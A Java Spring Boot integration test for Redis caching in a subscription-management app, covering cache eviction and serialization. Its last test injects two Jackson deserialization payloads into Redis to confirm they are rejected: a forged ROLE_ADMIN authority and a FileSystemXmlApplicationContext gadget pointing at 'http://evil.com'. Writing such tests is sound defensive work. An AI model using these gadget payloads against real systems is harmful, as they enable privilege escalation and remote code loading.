package com.aathithiyan.subscription.cache;

import com.aathithiyan.subscription.domain.BillingCycle;
import com.aathithiyan.subscription.domain.Role;
import com.aathithiyan.subscription.domain.SubscriptionCategory;
import com.aathithiyan.subscription.domain.SubscriptionStatus;
import com.aathithiyan.subscription.dto.SpendingAnalyticsResponse;
import com.aathithiyan.subscription.dto.SubscriptionCreateRequest;
import com.aathithiyan.subscription.dto.SubscriptionResponse;
import com.aathithiyan.subscription.dto.SubscriptionUpdateRequest;
import com.aathithiyan.subscription.entity.User;
import com.aathithiyan.subscription.repository.UserRepository;
import com.aathithiyan.subscription.service.AnalyticsService;
import com.aathithiyan.subscription.service.DecisionEngineService;
import com.aathithiyan.subscription.service.SubscriptionService;
import com.fasterxml.jackson.databind.exc.InvalidTypeIdException;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.cache.Cache;
import org.springframework.cache.CacheManager;
import org.springframework.data.redis.connection.RedisConnectionFactory;
import org.springframework.data.redis.serializer.SerializationException;

import java.math.BigDecimal;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.UUID;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

@SpringBootTest
class CachingIntegrationTest {

    @Autowired
    private DecisionEngineService decisionEngineService;

    @Autowired
    private AnalyticsService analyticsService;

    @Autowired
    private SubscriptionService subscriptionService;

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private CacheManager cacheManager;

    @Autowired
    private RedisConnectionFactory connectionFactory;

    private User testUser;

    @BeforeEach
    void setUp() {
        testUser = userRepository.save(User.builder()
                .email("cache_test_" + UUID.randomUUID() + "@example.com")
                .password("password123")
                .role(Role.USER)
                .build());

        // Clear caches prior to test
        for (String cacheName : cacheManager.getCacheNames()) {
            Cache cache = cacheManager.getCache(cacheName);
            if (cache != null) {
                cache.clear();
            }
        }
    }

    @Test
    void testRedisCachingAndAutomaticEvictionOnSubscriptionUpdate() {
        // Create initial subscription
        SubscriptionResponse sub1 = subscriptionService.createSubscription(testUser.getId(), new SubscriptionCreateRequest(
                "Cache Target 1", new BigDecimal("15.00"), BillingCycle.MONTHLY,
                SubscriptionCategory.ENTERTAINMENT, SubscriptionStatus.ACTIVE, null
        ));

        // 1. Initial analytics call -> populates cache
        decisionEngineService.getOverlaps(testUser.getId());

        Cache overlapsCache = cacheManager.getCache("overlaps");
        assertThat(overlapsCache).isNotNull();
        assertThat(overlapsCache.get(testUser.getId())).isNotNull();

        // 2. Modifying subscription via update -> evicts cache automatically
        subscriptionService.updateSubscription(testUser.getId(), sub1.getId(), new SubscriptionUpdateRequest(
                "Cache Target 1 Updated", new BigDecimal("25.00"), BillingCycle.MONTHLY,
                SubscriptionCategory.ENTERTAINMENT, SubscriptionStatus.ACTIVE, null
        ));

        assertThat(overlapsCache.get(testUser.getId())).isNull();

        // 3. Subsequent analytics call -> repopulates cache
        decisionEngineService.getOverlaps(testUser.getId());
        assertThat(overlapsCache.get(testUser.getId())).isNotNull();
    }

    @Test
    void testAutomaticCacheEvictionOnMarkUsed() {
        SubscriptionResponse sub = subscriptionService.createSubscription(testUser.getId(), new SubscriptionCreateRequest(
                "Mark Used Target", new BigDecimal("20.00"), BillingCycle.MONTHLY,
                SubscriptionCategory.SOFTWARE, SubscriptionStatus.ACTIVE, null
        ));

        // Populate efficiency_scores cache
        decisionEngineService.getEfficiencyScores(testUser.getId());
        Cache effCache = cacheManager.getCache("efficiency_scores");
        assertThat(effCache).isNotNull();
        assertThat(effCache.get(testUser.getId())).isNotNull();

        // Mark subscription used -> triggers cache eviction
        subscriptionService.markSubscriptionUsed(testUser.getId(), sub.getId());
        assertThat(effCache.get(testUser.getId())).isNull();
    }

    @Test
    void testAllFiveCacheNamespacesCanSerializeAndDeserialize() {
        subscriptionService.createSubscription(testUser.getId(), new SubscriptionCreateRequest(
                "Streaming Plus", new BigDecimal("19.99"), BillingCycle.MONTHLY,
                SubscriptionCategory.ENTERTAINMENT, SubscriptionStatus.ACTIVE, null
        ));
        subscriptionService.createSubscription(testUser.getId(), new SubscriptionCreateRequest(
                "Streaming Max", new BigDecimal("24.99"), BillingCycle.MONTHLY,
                SubscriptionCategory.ENTERTAINMENT, SubscriptionStatus.ACTIVE, null
        ));

        // 1. overlaps -> List<OverlapGroupResponse>
        decisionEngineService.getOverlaps(testUser.getId());
        Cache overlapsCache = cacheManager.getCache("overlaps");
        assertThat(overlapsCache).isNotNull();
        assertThat(overlapsCache.get(testUser.getId())).isNotNull();
        assertThat(overlapsCache.get(testUser.getId()).get()).isInstanceOf(List.class);

        // 2. renewal_risks -> List<RenewalRiskResponse>
        decisionEngineService.getRenewalRisks(testUser.getId());
        Cache risksCache = cacheManager.getCache("renewal_risks");
        assertThat(risksCache).isNotNull();
        assertThat(risksCache.get(testUser.getId())).isNotNull();
        assertThat(risksCache.get(testUser.getId()).get()).isInstanceOf(List.class);

        // 3. efficiency_scores -> List<EfficiencyScoreResponse>
        decisionEngineService.getEfficiencyScores(testUser.getId());
        Cache effCache = cacheManager.getCache("efficiency_scores");
        assertThat(effCache).isNotNull();
        assertThat(effCache.get(testUser.getId())).isNotNull();
        assertThat(effCache.get(testUser.getId()).get()).isInstanceOf(List.class);

        // 4. optimization_opportunities -> List<OptimizationOpportunityResponse>
        decisionEngineService.getOptimizationOpportunities(testUser.getId());
        Cache oppCache = cacheManager.getCache("optimization_opportunities");
        assertThat(oppCache).isNotNull();
        assertThat(oppCache.get(testUser.getId())).isNotNull();
        assertThat(oppCache.get(testUser.getId()).get()).isInstanceOf(List.class);

        // 5. spending_analytics -> SpendingAnalyticsResponse
        analyticsService.getSpendingAnalytics(testUser.getId(), "monthly");
        Cache spendCache = cacheManager.getCache("spending_analytics");
        assertThat(spendCache).isNotNull();
        assertThat(spendCache.get(testUser.getId() + "_monthly")).isNotNull();
        assertThat(spendCache.get(testUser.getId() + "_monthly").get())
                .isInstanceOf(SpendingAnalyticsResponse.class);
    }

    @Test
    void testPolymorphicDeserializationRejectsDisallowedClasses() {
        Cache cache = cacheManager.getCache("spending_analytics");
        assertThat(cache).isNotNull();

        // 1. Existing disallowed class denied by BasicPolymorphicTypeValidator
        String exploitKey = "spending_analytics::exploit_user_123";
        byte[] payload = "{\"@class\":\"org.springframework.security.core.authority.SimpleGrantedAuthority\",\"role\":\"ROLE_ADMIN\"}".getBytes(StandardCharsets.UTF_8);

        try (var connection = connectionFactory.getConnection()) {
            connection.stringCommands().set(exploitKey.getBytes(StandardCharsets.UTF_8), payload);
        }

        assertThatThrownBy(() -> cache.get("exploit_user_123"))
                .isInstanceOf(SerializationException.class)
                .hasCauseInstanceOf(InvalidTypeIdException.class);

        // 2. Security-sensitive gadget class blocked
        String gadgetExploitKey = "spending_analytics::gadget_user_456";
        byte[] gadgetPayload = "{\"@class\":\"org.springframework.context.support.FileSystemXmlApplicationContext\",\"configLocation\":\"http://evil.com\"}".getBytes(StandardCharsets.UTF_8);

        try (var connection = connectionFactory.getConnection()) {
            connection.stringCommands().set(gadgetExploitKey.getBytes(StandardCharsets.UTF_8), gadgetPayload);
        }

        assertThatThrownBy(() -> cache.get("gadget_user_456"))
                .isInstanceOf(SerializationException.class);
    }
}

